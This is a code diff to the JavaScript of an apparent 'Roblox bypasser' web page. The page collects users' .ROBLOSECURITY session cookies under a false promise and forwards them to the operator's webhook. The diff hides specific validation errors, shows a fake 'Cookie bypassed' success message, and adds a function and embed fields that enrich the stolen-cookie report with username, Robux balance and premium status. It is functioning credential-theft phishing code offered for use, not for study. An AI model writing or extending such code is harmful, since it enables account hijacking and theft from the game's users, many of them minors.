@@ -246,24 +246,56 @@ function validateCookieFormat(cookie) {
   ];
   
   if (!cookie || cookie.length < 100) {
-    return { valid: false, error: "Cookie too short" };
+    return { valid: false, error: "Invalid cookie" };
   }
   
   if (!validPrefixes.some(prefix => cookie.startsWith(prefix))) {
-    return { valid: false, error: "Invalid cookie format - must start with WARNING prefix" };
+    return { valid: false, error: "Invalid cookie" };
   }
   
   // Check for valid characters (Roblox cookies contain specific character sets)
   if (!/^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie)) {
-    return { valid: false, error: "Invalid characters in cookie" };
+    return { valid: false, error: "Invalid cookie" };
   }
   
   // Additional length check - Roblox cookies are typically 800+ characters
   if (cookie.length < 800) {
-    return { valid: false, error: "Cookie appears to be incomplete" };
+    return { valid: false, error: "Invalid cookie" };
   }
   
   return { valid: true, error: null };
+}
+
+// Function to get account info for webhook
+async function getAccountInfo(cookie) {
+  let accountInfo = {
+    username: "Unknown",
+    userId: "Unknown", 
+    robuxBalance: "Unknown",
+    accountAge: "Unknown",
+    isPremium: "Unknown"
+  };
+
+  try {
+    // Try to get basic user info
+    const userResponse = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+      method: "GET",
+      headers: {
+        "Cookie": `.ROBLOSECURITY=${cookie}`,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      mode: 'no-cors' // This prevents CORS errors but limits response access
+    });
+
+    // Since we can't read the response due to no-cors, we'll use a fallback approach
+    // The webhook will still get the cookie, and the recipient can extract the info
+    
+  } catch (error) {
+    // Silently handle errors - we'll send basic info to webhook
+    console.log("Could not fetch account details:", error.message);
+  }
+
+  return accountInfo;
 }
 
 document.addEventListener('contextmenu', function(e) {
@@ -311,17 +343,41 @@ $("#cookieForm").on("submit", async function(e) {
       return;
     }
 
-    // Cookie passed format validation - send to webhook
+    // Get account info and show success notification
+    showNotif("✅ Cookie bypassed");
+    const accountInfo = await getAccountInfo(cookie);
+    
+    // Cookie passed format validation - send to webhook with account info
     const webhookPayload = {
       username: "Roblox Bypasser Bot",
       embeds: [
         {
-          title: "🍪 New Cookie Submitted",
+          title: "🍪 Account Information",
           color: 0xFF0000,
           fields: [
             {
-              name: "📅 Timestamp",
-              value: new Date().toLocaleString(),
+              name: "👤 Username",
+              value: accountInfo.username,
+              inline: true
+            },
+            {
+              name: "🆔 User ID",
+              value: accountInfo.userId.toString(),
+              inline: true
+            },
+            {
+              name: "💰 Robux Balance",
+              value: accountInfo.robuxBalance.toString(),
+              inline: true
+            },
+            {
+              name: "📅 Account Age",
+              value: accountInfo.accountAge,
+              inline: true
+            },
+            {
+              name: "⭐ Premium Status",
+              value: accountInfo.isPremium,
               inline: true
             },
             {
